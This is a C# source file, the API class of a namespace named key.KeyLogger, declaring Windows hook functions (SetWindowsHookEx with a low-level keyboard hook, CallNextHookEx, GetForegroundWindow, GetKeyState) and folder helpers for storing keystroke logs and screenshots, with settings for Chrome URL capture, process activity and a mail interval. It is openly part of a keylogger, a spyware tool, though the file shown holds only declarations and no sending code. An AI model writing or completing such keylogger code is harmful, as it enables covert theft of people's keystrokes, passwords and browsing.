using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace key.KeyLogger
{
    public class API
    {
        public static string KeyBoard = "KeyBoard";
        public static string GetURLfromChrome = "GetURLfromChrome";
        public static string ProcessActivity = "ProcessActivity";

        public static string FolderText = "Text";
        public static void CreateFolderText()
        {
            if (!Directory.Exists(FolderText))
            {
                Directory.CreateDirectory(FolderText);
            }
        }
        public static string FolderDay = "Text/" + DateTime.Now.ToLongDateString();
        public static void CreateFolderDay()
        {
            if (!Directory.Exists(FolderDay))
            {
                Directory.CreateDirectory(FolderDay);
            }
        }
        public static string FolderImage = "Image";
        public static void CreateFolderImage()
        {
            if (!Directory.Exists(FolderImage))
            {
                Directory.CreateDirectory(FolderImage);
            }
        }

        //public static string logFile = "Output";
        public static string logName = "Log_";
        public static string logExtendtion = ".txt";

        public static string imagePath = "Image_";
        public static string imageExtendtion = ".png";
        //public static string SaveLogFileImage = System.IO.Directory.GetCurrentDirectory() "/";
        //public static string SaveLogFileText = System.IO.Directory.GetCurrentDirectory() + "/TextLog";

        public static int imageCount = 0;
        public static int captureTime = 400;

        public static int mailTime = 1000;
        public static int processTime = 1000;


        //shift
        public const int VK_SHIFT_VALUE = 0x10;


        //paramater
        public const int WH_KEYBOARD_LL = 13;
        public const int WM_KEYDOWN = 0x0100;

        //man hinh
        public static IntPtr _hookID = IntPtr.Zero;

        //gan 1 hook vao
        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
        //<summary>
        // Install hook into hook chain - hook proc uses to monitor the system for certain types of events.
        //</summary>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        //tha hook ra 
        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex
        //<summary>
        // Remove hook proc install in a hook chain.
        //</summary>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        //goi hook ke tiep
        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex
        //<summary>
        // Passed the hook infomation to next hook proc in the current hook chain.
        //</summary>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        //lay module handle 
        //Reference https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
        //<summary>
        // Retrieves a module handle for the specified module.
        //</summary>
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Delegate a LowLevelKeyboardProc to use user32.dll
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        public delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Set hook into all current process
        /// </summary>
        /// <param name="proc"></param>
        /// <returns></returns>
        /// 



        //Reference https://www.pinvoke.net/default.aspx/user32.getforegroundwindow
        //<summary>
        // Returns a handle to the window the user is working with.
        //</summary>
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowthreadprocessid
        //<summary>
        // Retrieves the identifier of the thread that created the specified window
        //</summary>
        [DllImport("user32.dll")]
        public static extern Int32 GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        //Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate
        //<summary>
        // Retrieves the status of the specified virtual key. Like up, down or toggle (on , off).
        //</summary>
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);
    }
}
